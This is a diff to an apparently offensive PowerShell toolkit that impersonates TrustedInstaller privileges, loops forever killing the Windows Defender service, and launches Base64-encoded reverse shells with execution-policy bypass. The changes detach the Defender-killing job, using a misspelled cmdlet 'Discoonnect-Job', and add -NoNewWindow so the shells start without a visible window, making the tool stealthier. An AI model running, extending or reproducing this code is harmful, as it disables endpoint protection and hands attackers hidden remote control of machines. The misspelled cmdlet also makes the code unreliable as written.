@@ -24,11 +24,13 @@ function Invoke-TrustedInstaller {
 
     # Start a background job consisting of an infinite loop that keeps killing the Windows Defender service
     # you need TI privileges to do this
-    Start-Job -ScriptBlock {
+    $ps = Start-Job -ScriptBlock {
         while ($true) {
             cmd.exe /c "taskkill /f /im MsMpSvc.exe"
         }
     }
+    
+    Discoonnect-Job -Job $ps
 
     # Print proof that we've successfully impersonated TI
     $imp_token = Get-NtToken -Impersonation
@@ -62,7 +64,7 @@ function Invoke-TIRevShell {
     $psbin = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
     $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($shell))
 
-    Start-Process -FilePath "$psbin" -ArgumentList "-ep", "bypass", "-e", "$encoded"
+    Start-Process -FilePath "$psbin" -ArgumentList "-ep", "bypass", "-e", "$encoded" -NoNewWindow
 }
 
 # Spawns a TLS-encrypted Base64 reverse shell with TI privileges using 'powershell -ep bypass -e'
@@ -95,5 +97,5 @@ function Invoke-TIRevShellTLS {
     $psbin = [System.Diagnostics.Process]::GetCurrentProcess().MainModule.FileName
     $encoded = [System.Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($shell))
 
-    Start-Process -FilePath "$psbin" -ArgumentList "-ep", "bypass", "-e", "$encoded"
+    Start-Process -FilePath "$psbin" -ArgumentList "-ep", "bypass", "-e", "$encoded" -NoNewWindow
 }
